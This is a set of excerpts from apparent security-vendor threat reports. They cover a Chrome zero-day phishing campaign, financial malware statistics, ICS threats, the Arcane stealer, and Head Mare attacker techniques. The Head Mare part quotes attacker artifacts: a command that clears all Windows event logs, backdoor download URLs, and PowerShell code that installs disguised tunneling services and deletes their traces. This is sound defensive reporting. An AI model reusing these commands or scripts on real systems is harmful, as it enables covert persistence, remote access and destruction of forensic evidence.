In all cases, infection occurred immediately after the victim clicked on a link in a phishing email, and the attackers&#8217; website was opened using the Google Chrome web browser. No further action was required to become infected. </p>\n<p>All malicious links were personalized and had a very short lifespan. However, Kaspersky&#8217;s exploit detection and protection technologies successfully identified the zero-day exploit that was used to escape Google Chrome&#8217;s sandbox. We quickly analyzed the exploit code, reverse-engineered its logic, and confirmed that it was based on a zero-day vulnerability affecting the latest version of Google Chrome. We then reported the vulnerability to the Google security team. Our detailed report enabled the developers to quickly address the issue, and on March 25, 2025, Google released an update fixing the vulnerability and <a href=\"https://chromereleases.googleblog.com/2025/03/stable-channel-update-for-desktop_25.html\" target=\"_blank\">thanked us</a> for discovering this attack.<br />\n<div class=\"wp-caption aligncenter\" id=\"attachment_116007\" style=\"width: 697px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/25212201/operation-forumtroll-01.png\"><img alt=\"Acknowledgement for finding CVE-2025-2783 (excerpt from security fixes included into Chrome 134.0.6998.177/.178)\n\" class=\"size-full wp-image-116007\" height=\"124\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/25212201/operation-forumtroll-01.png\" width=\"687\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-116007\">Acknowledgement for finding CVE-2025-2783 (excerpt from security fixes included into Chrome 134.0.6998.177/.178)<br /></p></div>\nWe have discovered and reported dozens of zero-day exploits actively used in attacks, but this particular exploit is certainly one of the most interesting we&#8217;ve encountered. The vulnerability CVE-2025-2783 really left us scratching our heads, as, without doing anything obviously malicious or forbidden, it allowed the attackers to bypass Google Chrome&#8217;s sandbox protection as if it didn&#8217;t even exist. The cause of this was a logical error at the intersection of Google Chrome&#8217;s sandbox and the Windows operating system. We plan to publish the technical details of this vulnerability once the majority of users have installed the updated version of the browser that fixes it.</p>\n<p>Our research is still ongoing, but judging by the functionality of the sophisticated malware used in the attack, it seems the attackers&#8217; goal was espionage. The malicious emails contained invitations allegedly from the organizers of a scientific and expert forum, &#8220;Primakov Readings&#8221;, targeting media outlets, educational institutions and government organizations in Russia. Based on the content of the emails, we dubbed the campaign Operation ForumTroll.<br />\n<div class=\"wp-caption aligncenter\" id=\"attachment_116006\" style=\"width: 634px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/25212153/operation-forumtroll-02-1.png\"><img alt=\"Example of a malicious email used in this campaign (translated from Russian)\" class=\"size-full wp-image-116006\" height=\"336\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/25212153/operation-forumtroll-02-1.png\" width=\"624\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-116006\">Example of a malicious email used in this campaign (translated from Russian)</p></div>\n<p>At the time of writing, there&#8217;s no exploit active at the malicious link – it just redirects visitors to the official <a href=\"https://primakovreadings.ru/\" target=\"_blank\">website</a> of &#8220;Primakov Readings&#8221;. However, we strongly advise against clicking on any potentially malicious links.</p>\n<p>The exploit we discovered was designed to run in conjunction with an additional exploit that enables remote code execution. Unfortunately, we were unable to obtain this second exploit, as in this particular case it would have required waiting for a new wave of attacks and exposing users to the risk of infection. Fortunately, patching the vulnerability used to escape the sandbox effectively blocks the entire attack chain.</p>\n<p>All the attack artifacts analyzed so far indicate high sophistication of the attackers, allowing us to confidently conclude that a state-sponsored APT group is behind this attack.</p>\n<p>We plan to publish a detailed report with technical details about the zero-day exploit, the sophisticated malware, and the attackers&#8217; techniques.</p>\n<p>Kaspersky products detect the exploits and malware used in this attack with the following verdicts:</p>\n<ul>\n<li>Exploit.Win32.Generic</li>\n<li>Trojan.Win64.Agent</li>\n<li>Trojan.Win64.Convagent.gen</li>\n<li>PDM:Exploit.Win32.Generic</li>\n<li>PDM:Trojan.Win32.Generic</li>\n<li>UDS:DangerousObject.Multi.Generic</li>\n</ul>\n<h2 id=\"indicators-of-compromise\">Indicators of Compromise</h2>\n<p><a href=\"https://opentip.kaspersky.com/primakovreadings.info/icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______05122bf6e284c4c0&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">primakovreadings[.]info</a><br />\n<input class=\"category_for_banner\" type=\"hidden\" value=\"forumtroll-next-banner\" />",

That&#8217;s why Kaspersky researchers analyze the trends related to these threats and share an annual report highlighting the main dangers to corporate and consumer finances. This report contains key trends and statistics on financial phishing, mobile and PC banking malware, as well as offers actionable recommendations to bolster security measures and effectively mitigate emerging threats</p>\n<h2 id=\"methodology\">Methodology</h2>\n<p>In this report, we present an analysis of financial cyberthreats in 2024, focusing on banking Trojans and phishing pages that target online banking, shopping accounts, cryptocurrency wallets and other financial assets. To gain an understanding of the financial threat landscape, we analyzed anonymized data on malicious activities detected on the devices of Kaspersky security product users and consensually provided to us through the Kaspersky Security Network (KSN). Note that for mobile banking malware, we retrospectively revised the 2023 numbers to provide more accurate statistics. We also changed the methodology for PC banking malware by removing obsolete families that no longer use Trojan banker functionality, hence the sharp drop in numbers against 2023.</p>\n<h2 id=\"key-findings\">Key findings</h2>\n<p><strong>Phishing</strong></p>\n<ul>\n<li>Banks were the most popular lure in 2024, accounting for 42.58% of financial phishing attempts.</li>\n<li>Amazon Online Shopping was mimicked by 33.19% of all phishing and scam pages targeting online store users in 2024.</li>\n<li>Cryptocurrency phishing saw an 83.37% year-over-year increase in 2024, with 10.7 million detections compared to 5.84 million in 2023.</li>\n</ul>\n<p><strong>PC malware</strong></p>\n<ul>\n<li>The number of users affected by financial malware for PCs dropped from 312,000 in 2023 to 199,000 in 2024.</li>\n<li>ClipBanker, Grandoreiro and CliptoShuffler were the prevalent malware families, together targeting over 89% of affected users.</li>\n<li>Consumers remained the primary target of financial cyberthreats, accounting for 73.69% of attacks.</li>\n</ul>\n<p><strong>Mobile malware</strong></p>\n<ul>\n<li>Nearly 248,000 users encountered mobile banking malware in 2024 – almost 3.6 times more than in 2023 when 69,000 users were affected.</li>\n<li>Mamont was the most active Android malware family, accounting for 36.7% of all mobile banker attacks.</li>\n<li>Users in Turkey were the most targeted.</li>\n</ul>\n<h2 id=\"financial-phishing\">Financial phishing</h2>\n<p>In 2024, online fraudsters continued to lure users to phishing and scam pages that mimicked the websites of popular brands and financial organizations. The attackers employed social engineering techniques to trick victims into sharing their financial data or making a payment on a fake page.</p>\n<p>We analyzed phishing detections separately for users of our home and business products.

Another contributing factor was the tendency of attackers to frequently change domains and IP addresses to evade detection in the initial stages, based on lists of known malicious resources.</p>\n<p>In practice, this means that until a malicious web resource is identified and added to a denylist, it may not immediately appear in threat statistics, leading to an apparent decrease in the percentage of ICS computers on which such resources were blocked.</p>\n<p>However, in Q4, we also saw a rise in the percentage of the next steps in the attack chain – malicious scripts and phishing pages (7.11%), spyware (4.30%), and ransomware (0.21%).</p>\n<p>A significant increase in the percentage of malicious scripts and phishing pages in October was driven by a series of widespread phishing attacks in late summer and early fall 2024, as mentioned in the <a href=\"https://securelist.com/ics-cert.kaspersky.com/publications/reports/2024/12/25/threat-landscape-for-industrial-automation-systems-q3-2024/#yv6zsndhdzi9ywgy\" rel=\"noopener\" target=\"_blank\">Q3 2024 report</a>. Threat actors used malicious scripts that executed in the browser, mimicking various windows with CAPTCHA-like interfaces, browser error messages and similar pop-ups to trigger the download of next-stage malware: <a href=\"https://securelist.com/fake-captcha-delivers-lumma-amadey/114312/\" rel=\"noopener\" target=\"_blank\">either the Lumma stealer or the Amadey Trojan</a>.</p>\n<h3 id=\"next-stage-malware\">Next-stage malware</h3>\n<p>Malicious objects used to initially infect computers deliver next-stage malware – spyware, ransomware, and miners – to victims&#8217; computers. As a rule, the higher the percentage of ICS computers on which the initial infection malware is blocked, the higher the percentage for next-stage malware.</p>\n<p>The percentage of ICS computers on which spyware (spy Trojans, backdoors and keyloggers) was blocked increased by 0.39 pp from the previous quarter to 4.30%.</p>\n<p>The percentage of ICS computers on which ransomware was blocked increased by a factor of 1.3 compared to the previous quarter, reaching 0.21%, its highest value in two years.</p>\n<p>The percentage of ICS computers on which miners in the form of executable files for Windows were blocked decreased by 0.01 pp to 0.70%.</p>\n<p>And, the percentage of ICS computers on which web miners were blocked decreased by 0.02 pp to 0.39%, reaching its lowest value in the observed period.</p>\n<h3 id=\"self-propagating-malware\">Self-propagating malware</h3>\n<p>Self-propagating malware (worms and viruses) is a category unto itself. Worms and virus-infected files were originally used for initial infection, but as botnet functionality evolved, they took on next-stage characteristics. To spread across ICS networks, viruses and worms rely on removable media, network folders, infected files including backups, and network attacks on outdated software.</p>\n<p>In Q4 2024, the percentage of ICS computers on which worms were blocked increased by 0.07 pp and reached 1,37%. The rate of viruses increased by 0.08 pp to 1.61%.</p>\n<h3 id=\"autocad-malware\">AutoCAD malware</h3>\n<p>AutoCAD malware is typically a low-level threat, coming last in the malware category rankings in terms of the percentage of ICS computers on which it was blocked.</p>\n<p>In Q4 2024, the percentage of ICS computers on which AutoCAD malware was blocked continued to decrease by losing 0.02 pp and reached 0.38%.</p>\n<p>You can find the full Q3 2024 report on the <a href=\"https://ics-cert.kaspersky.com/publications/reports/2025/03/17/threat-landscape-for-industrial-automation-systems-q4-2024/\" rel=\"noopener\" target=\"_blank\">Kaspersky ICS CERT website</a>.</p>",

What&#8217;s intriguing about this malware is how much it collects. It grabs account information from VPN and gaming clients, and all kinds of network utilities like ngrok, Playit, Cyberduck, FileZilla and DynDNS. The stealer was named Arcane, not to be confused with the well-known Arcane Stealer V. The malicious actor behind Arcane went on to release a similarly named loader, which supposedly downloads cheats and cracks, but in reality delivers malware to the victim&#8217;s device.</p>\n<h2 id=\"distribution\">Distribution</h2>\n<p>The campaign in which we discovered the new stealer was already active before Arcane appeared. The original distribution method started with YouTube videos promoting game cheats. The videos were frequently accompanied by a link to an archive and a password to unlock it. Upon unpacking the archive, the user would invariably discover a start.bat batch file in the root folder and the UnRAR.exe utility in one of the subfolders.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115921\" style=\"width: 425px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18142056/arcane-stealer.png\"><img alt=\"Archive root\" class=\"size-full wp-image-115921\" height=\"139\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18142056/arcane-stealer.png\" width=\"415\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115921\">Archive root</p></div>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115922\" style=\"width: 392px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18142137/arcane-stealer2.png\"><img alt=\"Contents of the &quot;natives&quot; subfolder\" class=\"size-full wp-image-115922\" height=\"141\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18142137/arcane-stealer2.png\" width=\"382\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115922\">Contents of the &#8220;natives&#8221; subfolder</p></div>\n<p>The contents of the batch file were obfuscated.

It is worth noting that a stealer with a similar name has been encountered before: a Trojan named &#8220;<a href=\"https://threatpost.com/arcane-stealer-low-end-dark-web/148741/\" rel=\"noopener\" target=\"_blank\">Arcane Stealer V</a>&#8221; was offered on the dark web in 2019, but it shares little with our find. The new stealer takes its name from the ASCII art in the code.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115927\" style=\"width: 602px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18142558/arcane-stealer7.png\"><img alt=\"Arcane logo\" class=\"size-full wp-image-115927\" height=\"228\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18142558/arcane-stealer7.png\" width=\"592\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115927\">Arcane logo</p></div>\n<p>Arcane succeeded VGS in November. Although much of it was borrowed from other stealers, we could not attribute it to any of the known families.</p>\n<p>Arcane gets regular updates, so its code and capabilities change from version to version. We will describe the common functionality present in various modifications and builds. In addition to logins, passwords, credit card data, tokens and other credentials from various Chromium and Gecko-based browsers, Arcane steals configuration files, settings and account information from the following applications:</p>\n<ul>\n<li>VPN clients: OpenVPN, Mullvad, NordVPN, IPVanish, Surfshark, Proton, hidemy.name, PIA, CyberGhost, ExpressVPN</li>\n<li>Network clients and utilities: ngrok, Playit, Cyberduck, FileZilla, DynDNS</li>\n<li>Messaging apps: ICQ, Tox, Skype, Pidgin, Signal, Element, Discord, Telegram, Jabber, Viber</li>\n<li>Email clients: Outlook</li>\n<li>Gaming clients and services: Riot Client, Epic, Steam, Ubisoft Connect (ex-Uplay), Roblox, Battle.net, various Minecraft clients</li>\n<li>Crypto wallets: Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum, Atomic, Guarda, Coinomi</li>\n</ul>\n<p>In addition, the stealer collects all kinds of system information, such as the OS version and installation date, digital key for system activation and license verification, username and computer name, location, information about the CPU, memory, graphics card, drives, network and USB devices, and installed antimalware and browsers. Arcane also takes screenshots of the infected device, obtains lists of running processes and Wi-Fi networks saved in the OS, and retrieves the passwords for those networks.</p>\n<p>Arcane&#8217;s functionality for stealing data from browsers warrants special attention. Most browsers generate unique keys for encrypting sensitive data they store, such as logins, passwords, cookies, etc. Arcane uses the Data Protection API (DPAPI) to obtain these keys, which is typical of stealers. But Arcane also contains an executable file of the Xaitax utility, which it uses to crack browser keys. To do this, the utility is dropped to disk and launched covertly, and the stealer obtains all the keys it needs from its console output.</p>\n<p>The stealer implements an additional method for extracting cookies from Chromium-based browsers through a debug port. The Trojan secretly launches a copy of the browser with the &#8220;remote-debugging-port&#8221; argument, then connects to the debug port, issues commands to visit several sites, and requests their cookies. The list of resources it visits is provided below.</p>\n<ul>\n<li>https://gmail.com,</li>\n<li>https://drive.google.com,</li>\n<li>https://photos.google.com,</li>\n<li>https://mail.ru,</li>\n<li>https://rambler.ru,</li>\n<li>https://steamcommunity.com,</li>\n<li>https://youtube.com,</li>\n<li>https://avito.ru,</li>\n<li>https://ozon.ru,</li>\n<li>https://twitter.com,</li>\n<li>https://roblox.com,</li>\n<li>https://passport.yandex.ru</li>\n</ul>\n<h2 id=\"arcanaloader\">ArcanaLoader</h2>\n<p>Within a few months of discovering the stealer, we noticed a new distribution pattern. Rather than promoting cheats, the threat actors shifted to advertising ArcanaLoader on their YouTube channels. This is a loader with a graphical user interface for downloading and running the most popular cracks, cheats and other similar software. More often than not, the links in the videos led to an executable file that downloaded an archive with ArcanaLoader.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115928\" style=\"width: 985px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18142741/arcane-stealer8.png\"><img alt=\"ArcanaLoader\" class=\"size-full wp-image-115928\" height=\"516\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18142741/arcane-stealer8.png\" width=\"975\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115928\">ArcanaLoader</p></div>\n<details>\nSee translation\n<table>\n<tbody>\n<tr>\n<td>Читы</td>\n<td>Cheats</td>\n</tr>\n<tr>\n<td>Настройки</td>\n<td>Settings</td>\n</tr>\n<tr>\n<td>Клиенты с читами</td>\n<td>Clients with cheats</td>\n</tr>\n<tr>\n<td>Все версии</td>\n<td>All versions</td>\n</tr>\n<tr>\n<td>Введите название чита</td>\n<td>Enter cheat name</td>\n</tr>\n<tr>\n<td>Версия: 1.16.5</td>\n<td>Version: 1.16.5</td>\n</tr>\n<tr>\n<td>Запустить</td>\n<td>Start</td>\n</tr>\n<tr>\n<td>Версия: Все Версии</td>\n<td>Version: All versions</td>\n</tr>\n</tbody>\n</table>\n</details>\n<p>The loader itself included a link to the developers&#8217; Discord server, which featured channels for news, support and links to download new versions.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115929\" style=\"width: 765px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18143043/arcane-stealer9.png\"><img alt=\"Discord server invitation\" class=\"size-full wp-image-115929\" height=\"464\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18143043/arcane-stealer9.png\" width=\"755\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115929\">Discord server invitation</p></div>\n<details>\nSee translation\n<p>You have been invited to Arcana Loader<br />\n548 online<br />\n3,156 users<br />\nAccept invitation</p>\n</details>\n<p>At the same time, one of the Discord channels posted an ad, looking for bloggers to promote ArcanaLoader.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115930\" style=\"width: 983px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18143320/arcane-stealer10.png\"><img alt=\"Looking for bloggers to spread the loader\" class=\"size-full wp-image-115930\" height=\"884\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/18143320/arcane-stealer10.png\" width=\"973\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115930\">Looking for bloggers to spread the loader</p></div>\n<details>\nSee translation\n<p>ArcanaLoader BOT<br />\nForm:<br />\n1.

Besides, the Arcane stealer itself is fascinating because of all the different data it collects and the tricks it uses to extract the information the attackers want. To stay safe from these threats, we suggest being wary of ads for shady software like cheats and cracks, avoiding links from unfamiliar bloggers, and using <a href=\"https://www.kaspersky.com/premium?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team___kprem____3b7590825188da5e\" rel=\"noopener\" target=\"_blank\">strong security software</a> to detect and disarm rapidly evolving malware.</p>",

Our investigation showed that Head Mare relied heavily on tools previously associated with Twelve. Additionally, Head Mare attacks utilized command-and-control (C2) servers exclusively linked to Twelve prior to these incidents. This suggests potential collaboration and joint campaigns between the two groups.</p>\n<p>The attackers continue to refine their methods, employing both familiar tools from past Head Mare incidents and new PowerShell-based tools.</p>\n<p>This report analyzes the software and techniques observed in recent Head Mare attacks and how these overlap with Twelve&#8217;s activities. The focus is on Head Mare&#8217;s TTPs and their evolution, with notes on commonalities with Twelve&#8217;s TTPs.</p>\n<h2 id=\"technical-details\">Technical details</h2>\n<h3 id=\"head-mares-toolkit\">Head Mare&#8217;s toolkit</h3>\n<p>The attackers used various publicly available tools, including open-source software and leaked proprietary tools, to achieve their goals.</p>\n<ul>\n<li>mimikatz;</li>\n<li>ADRecon;</li>\n<li>secretsdump;</li>\n<li>ProcDump;</li>\n<li>Localtonet;</li>\n<li>revsocks;</li>\n<li>ngrok;</li>\n<li>cloudflared;</li>\n<li>Gost;</li>\n<li>fscan;</li>\n<li>SoftPerfect Network Scanner;</li>\n<li>mRemoteNG;</li>\n<li>PSExec;</li>\n<li>smbexec;</li>\n<li>wmiexec;</li>\n<li>LockBit 3.0;</li>\n<li>Babuk.</li>\n</ul>\n<p>Some of these tools were mentioned in our previous <a href=\"https://securelist.com/head-mare-hacktivists/113555/\" rel=\"noopener\" target=\"_blank\">report</a> on Head Mare, while others were new to their arsenal.</p>\n<h3 id=\"notable-new-tools\">Notable new tools</h3>\n<p>Among the tools used by Head Mare were some not previously employed by the hacktivists but seen in attacks by other groups. For instance, they used the <strong>CobInt</strong> backdoor for remote access to domain controllers, previously observed only in Twelve&#8217;s attacks on Russian companies. This is an interesting fact, suggesting that Twelve and Head Mare may be sharing tools.</p>\n<p>In addition to <strong>CobInt</strong>, the attackers used their own <strong>PhantomJitter</strong> backdoor, installed on servers for remote command execution. This tool appeared in the group&#8217;s arsenal in August 2024. We described its modus operandi in a story accessible to the subscribers of our <a href=\"https://www.kaspersky.com/enterprise-security/threat-intelligence?icid=gl_securelist_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______c41a63524a629091\" rel=\"noopener\" target=\"_blank\">Threat Intelligence</a> reports.</p>\n<p>Another new tactic involved a tool for remote command execution on a business automation platform server. Thus, the attackers used both proven and new tools, demonstrating flexibility and adaptability.</p>\n<h3 id=\"initial-access\">Initial Access</h3>\n<p>While previous Head Mare attacks relied solely on phishing emails with malicious attachments, they now also infiltrate victims&#8217; infrastructure through compromised contractors with access to business automation platforms and RDP connections. This confirms the trend of hacktivists <a href=\"https://securelist.com/trusted-relationship-attack/112731/\" rel=\"noopener\" target=\"_blank\">exploiting trusted relationships</a> (T1199  –  Trusted Relationship and T1078  –  Valid Accounts).</p>\n<p>The attackers also exploited software vulnerabilities, most commonly <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38831\" rel=\"noopener\" target=\"_blank\">CVE-2023-38831</a> in WinRAR through phishing emails. In one incident, they exploited the Microsoft Exchange server vulnerability <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855\" rel=\"noopener\" target=\"_blank\">CVE-2021-26855</a> (ProxyLogon). Although patched in 2021, this vulnerability is still exploitable due to organizations using outdated operating systems and software. Our telemetry data revealed domain controllers still running Microsoft Windows Server 2012 R2 Server Standard x64 or, as in the aforementioned incidents, Microsoft Exchange Server 2016 used for email.</p>\n<p>The attackers used ProxyLogon to execute a command to download and launch <strong>CobInt</strong> on the server.</p>\n<h3 id=\"persistence\">Persistence</h3>\n<p>The method of establishing persistence has changed. Instead of creating scheduled tasks, the attackers now create new privileged local users on a business automation platform server. They use these accounts to connect to the server via <strong>RDP</strong> to transfer and execute tools interactively.</p>\n<p>They also install traffic tunneling tools like <strong>Localtonet</strong> for persistent access to the target host. They made Localtonet persistent with the help of <strong>Non-Sucking Service Manager (NSSM)</strong>, which allows running any application as a Windows service, as well as monitoring and restarting it if it fails for some reason. This user-friendly tool is often used legitimately to install and manage programs that cannot function as services. Localtonet and NSSM help the malicious actor to maintain continuous access to the infected host.</p>\n<h3 id=\"anti-detection-techniques\">Anti-detection techniques</h3>\n<p>Head Mare continued to use the Masquerading technique (T1655), naming utility executables like standard operating system files. The investigation found files such as:</p>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"50%\"><strong>Software</strong></td>\n<td width=\"50%\"><strong>Path in the system</strong></td>\n</tr>\n<tr>\n<td>Cloud storages sync tool rclone</td>\n<td>C:\\ProgramData\\wusa.exe</td>\n</tr>\n<tr>\n<td>PhantomJitter</td>\n<td>C:\\Windows\\System32\\inetsrv\\calc.exe</td>\n</tr>\n<tr>\n<td>cloudflared</td>\n<td>C:\\Windows\\System32\\winuac.exe</td>\n</tr>\n<tr>\n<td>Gost</td>\n<td>C:\\Windows\\System32\\winsw.exe</td>\n</tr>\n</tbody>\n</table>\n<p>In one incident, cmd.exe was renamed to log.exe and launched from C:\\Users\\[username]\\log.exe.</p>\n<p>Besides renaming files, the attackers also removed services and files they had created and cleared event logs to evade detection. Relevant artifacts were found in the PowerShell command history on attacked machines:</p><pre class=\"crayon-plain-tag\">stop-service -name &lt;servicename&gt;\nremove-service -name &lt;servicename&gt;\nremove-service -name \"&lt;servicename&gt;\"\nsc stop &lt;servicename&gt;\nsc delete &lt;servicename&gt;\nGet-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }</pre><p>\nThe ransomware executable also cleared system logs, as evidenced by a flag in the configuration of the samples that we have analyzed.</p>\n<h3 id=\"command-and-control\">Command and Control</h3>\n<p>After exploiting the business automation platform server, attackers downloaded and installed the PhantomJitter backdoor. In the incidents we observed, the backdoor was downloaded into the victims&#8217; infrastructure from the following URLs:</p><pre class=\"crayon-plain-tag\">http[:]//45.87.246[.]34:443/calc.exe\nhttp[:]//185.158.248[.]107:443/calc.exe</pre><p>\nThe file was saved in the local directory as c.exe. Upon launch, it connected to the C2 server, allowing the operator to execute commands on the compromised host.</p>\n<p>In addition to <strong>PhantomJitter</strong>, the attackers used <strong>CobInt</strong>, whose payload connected to the following C2 server:</p><pre class=\"crayon-plain-tag\">360nvidia[.]com</pre><p>\nThe domain resolves to the IP address 45.156.27[.]115.</p>\n<h3 id=\"pivoting\">Pivoting</h3>\n<p>The group expanded its arsenal to achieve their objectives at this stage. To gain remote access to the compromised infrastructure, they used a custom PowerShell script named proxy.ps1 to install and configure cloudflared and Gost.</p>\n<p><strong>Gost</strong> is a lightweight, powerful proxy utility offering various network routing and traffic hiding capabilities. It supports multiple protocols and can create secure communication channels, bypass blocks, and establish tunnels.</p>\n<p><strong>Cloudflared</strong> tunnels traffic through the Cloudflare network. It establishes a secure connection to an attacker-controlled Cloudflare server, acting as a proxy for C2 communication. This bypasses network restrictions like NAT (Network Address Translation) and firewall rules that might hinder direct connections between the victim host and attacker servers.</p>\n<p>The proxy.ps1 script can also download archives from URLs specified on a command line and extract them to a temporary folder. Below is the help output for the script:</p><pre class=\"crayon-plain-tag\">Usage: .\\proxy.ps1 -r https://&lt;site&gt;.com/archive.zip -p gost_port -t cloudflared_token \n\nParameters:\n  -l       Extract archive locally.\n  -r       Download and extract archive remotely.\n  -p       Specify the port for the gost.\n  -t       Specify the token for the cloudflared.\n  -u       Uninstall gost &amp; cloudflared.\n  -h       Show this help message.</pre><p>\nThe script defines constants for filenames, installing cloudflared and Gost with names mimicking standard Windows services in the C:\\Windows\\System32 folder. The script uses the GetTempFileName function to obtain temporary file paths.</p><pre class=\"crayon-plain-tag\">$archivePath = \"win.zip\"\n$filesPath = \"C:\\Windows\\System32\"\n$cloudflaredPath = Join-Path -Path $filesPath -ChildPath \"winuac.exe\"\n$gostPath = Join-Path -Path $filesPath -ChildPath \"winsw.exe\"\n$winswPath = Join-Path -Path $filesPath -ChildPath \"winsws.exe\"\n$winswxmlPath = Join-Path -Path $filesPath -ChildPath \"winsws.xml\"\n$tempFile = [System.IO.Path]::GetTempFileName()</pre><p>\nIf the -p flag is specified in the command line, a service for the Gost tool will be installed on the system. The following function is used for this:</p><pre class=\"crayon-plain-tag\">function Setup-Gost-Service {\n    # Set port\n    [xml]$winswxml = Get-Content $winswxmlPath\n    $winswxml.service.arguments = $winswxml.service.arguments -replace '42716', $p\n    $winswxml.Save($winswxmlPath)\n    Write-Host \"[*] Port number updated to $port in $winswxmlPath\"\n\n    # Service install\n    Write-Host \"[*] Installing gost as service\"\n    Start-Process $winswPath -ArgumentList \"install\" -RedirectStandardOutput $tempFile -NoNewWindow -Wait\n    $output = Get-Content $tempFile\n    Write-Output $output\n    Start-Process $winswPath -ArgumentList \"start\" -RedirectStandardOutput $tempFile -NoNewWindow -Wait\n    $output = Get-Content $tempFile\n    Write-Output $output\n}</pre><p>\nIn this code snippet, the script installs the Gost executable file as a service and passes necessary settings to it.</p>\n<p>If -t key is passed to the script, it installs and configures cloudflared in the system.</p><pre class=\"crayon-plain-tag\">function Setup-Cloudflared-Service {\n\n    # Service install\n    Write-Host \"[*] Installing cloudflared as service\"\n    Start-Process $cloudflaredPath -ArgumentList \"service install $t\" -RedirectStandardError $tempFile -NoNewWindow -Wait\n    $output = Get-Content $tempFile\n    Write-Output $output\n}</pre><p>\nIn this code snippet, the script installs the cloudflared service and passes settings to it by means of the command line.</p>\n<p>In addition to installing and configuring tunneling tools, the script has the ability to remove the artifacts they leave behind. The script can also stop and uninstall the cloudflared and Gost services, if the -u parameter is passed to it when it launches.</p><pre class=\"crayon-plain-tag\">if ($u) {\n    Write-Host \"[*] Uninstalling gost\"\n    Start-Process sc.exe -ArgumentList \"stop winsw\" -RedirectStandardOutput $tempFile -NoNewWindow -Wait\n    $output = Get-Content $tempFile\n    Write-Output $output\n    Start-Process $winswPath -ArgumentList \"uninstall\" -RedirectStandardOutput $tempFile -NoNewWindow -Wait\n    $output = Get-Content $tempFile\n    Write-Output $output\n\n    Write-Host \"[*] Uninstalling cloudflared\"\n    Start-Process sc.exe -ArgumentList \"stop winuac\" -RedirectStandardOutput $tempFile -NoNewWindow -Wait\n    $output = Get-Content $tempFile\n    Write-Output $output\n    Start-Process $cloudflaredPath -ArgumentList \"service uninstall\" -RedirectStandardError $tempFile -NoNewWindow -Wait\n    $output = Get-Content $tempFile\n    Write-Output $output\n\n    $filePaths = @(\n    \"C:\\Windows\\System32\\winsws.wrapper.log\",\n    \"C:\\Windows\\System32\\winsws.err.log\",\n    \"C:\\Windows\\System32\\winsws.out.log\",\n    \"C:\\Windows\\System32\\winsws.xml\",\n    \"C:\\Windows\\System32\\winsws.exe\",\n    \"C:\\Windows\\System32\\winsw.exe\",\n    \"C:\\Windows\\System32\\winuac.exe\"\n    )\n    foreach ($filePath in $filePaths) {\n    if (Test-Path $filePath) {\n        Remove-Item -Path $filePath -Force\n        Write-Output \"[*] Deleted: $filePath\"\n    } else {\n        Write-Output \"[*] File not found: $filePath\"\n    }\n    }\n}</pre><p>\nAfter deleting the services, the script deletes executables, configuration files, and logs of the tools.</p>\n<p>In one incident, the attackers downloaded cloudflared and Gost from the server 45[.]156[.]21[.]148, which we previously saw in Head Mare attacks. An example download link is:</p><pre class=\"crayon-plain-tag\">hxxp://45[.]156[.]21[.]148:8443/winuac.exe</pre><p>\nBesides cloudflared and Gost, the attackers used cloud tunnels like ngrok and Localtonet. <strong>Localtonet</strong> is a reverse proxy server providing internet access to local services. The attackers launched it as a service using NSSM, downloading both tools from the official Localtonet website (localtonet[.]com).</p><pre class=\"crayon-plain-tag\">hxxp://localtonet[.]com/nssm-2.24.zip\nhxxp://localtonet[.]com/download/localtonet-win-64.zip</pre><p>\nAfter downloading, they extracted the tools and launched them with these parameters:</p><pre class=\"crayon-plain-tag\">nssm.exe install Win32_Serv \nlocaltonet.exe authtoken &lt;token&gt;</pre><p>\nThese commands allow installing Localtonet as a service and authorizing it with a token for configuration.</p>\n<h3 id=\"reconnaissance\">Reconnaissance</h3>\n<p>The attackers used common system reconnaissance tools like quser.exe, tasklist.exe, and netstat.exe on local hosts. They primarily used fscan and SoftPerfect Network Scanner for local network 